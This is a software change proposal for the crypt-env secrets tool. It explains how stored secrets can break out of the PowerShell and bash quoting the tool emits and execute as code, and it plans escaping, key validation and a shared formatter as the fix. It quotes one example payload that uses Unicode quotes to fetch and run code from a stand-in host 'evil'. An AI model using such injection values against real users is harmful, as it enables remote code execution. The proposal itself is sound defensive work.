## Why

Secrets that crypt-env formats as shell code can execute as code:
- **CLI-1:** `shell::format_assignment` doubles only ASCII `'` for PowerShell (`bin/crypt-env/shell.rs:18-20`). PowerShell also treats `‘ ’ ‚ ‛` (U+2018–U+201B) as single quotes. A value such as `’; iex (iwr evil) ;’`, which could arrive through a relay share, an import or a pasted `.env`, breaks out of the literal when the user runs `crypt-env inject KEY | Invoke-Expression`. The key is not validated either, so a crafted key name injects code too.
- **CLI-2:** the GUI "Copy as bash / PowerShell" builds `export NAME=${value}` with no quoting at all, and `$env:NAME = "${value}"` inside double quotes, where `$()` runs (`src/components/rows/SecretRow.tsx:89-91`). Pasting runs any `$(...)` in the value, and values with spaces are cut short.
- The documented usage `eval $(crypt-env inject KEY)` is unquoted. Word splitting and glob expansion of the output can corrupt values, and filenames in the current directory can end up inside the evaluated string. The safe form is `eval "$(crypt-env inject KEY)"`.

## What Changes

- **Complete PowerShell escaping.** PowerShell single-quote escaping doubles *all five* single-quote characters (`'`, U+2018, U+2019, U+201A, U+201B). POSIX escaping keeps the `'\''` form.
- **Key validation.** Keys must match `^[A-Za-z_][A-Za-z0-9_]*$` before any shell assignment is emitted; otherwise the command fails with an error that names the key.
- **Newlines.** Values containing a newline are emitted in a form that preserves it: POSIX `$'...'` ANSI-C quoting for bash and zsh; PowerShell single quotes keep newlines verbatim; for `sh`, the command fails with an explanation.
- **One formatter for the GUI.** The GUI copy actions reuse the same formatter through a Tauri command, `shell_format_assignment(shell, key, value)`, instead of building strings in TypeScript. The `.env` copy format uses the serializer from `env-file-content-safety`.
- **Quoted `eval` everywhere.** Docs and CLI help switch to `eval "$(crypt-env inject KEY)"` and `crypt-env inject KEY | Invoke-Expression`.

## Capabilities

### New Capabilities
- `shell-export-quoting`: guarantees that every shell assignment crypt-env emits (CLI `inject`, GUI copy-as) evaluates to exactly the stored value and never executes content from it.

### Modified Capabilities
- `cli`: *Secret environment variable injection via inject*. The documented invocation becomes the quoted `eval` form, and invalid keys are refused.

## Impact

- `bin/crypt-env/shell.rs`. A shared formatter module is needed so the GUI crate can use it: it moves to `src-tauri/src/shellfmt.rs` in the library crate, and the CLI re-exports it.
- New Tauri command `shell_format_assignment`, registered in `lib.rs`; `SecretRow.tsx` uses it.
- Docs: `docs/index.html`, `docs/cli.md`, and the CLI `--help` text.
- **Depends on** `env-file-content-safety` for the `.env` copy form. If applied first, the `.env` copy uses a local copy of the serializer until the later change lands.

## Non-Goals

- Supporting `fish`, `nu` or `cmd.exe` output formats.
- Changing what `inject` outputs besides quoting.
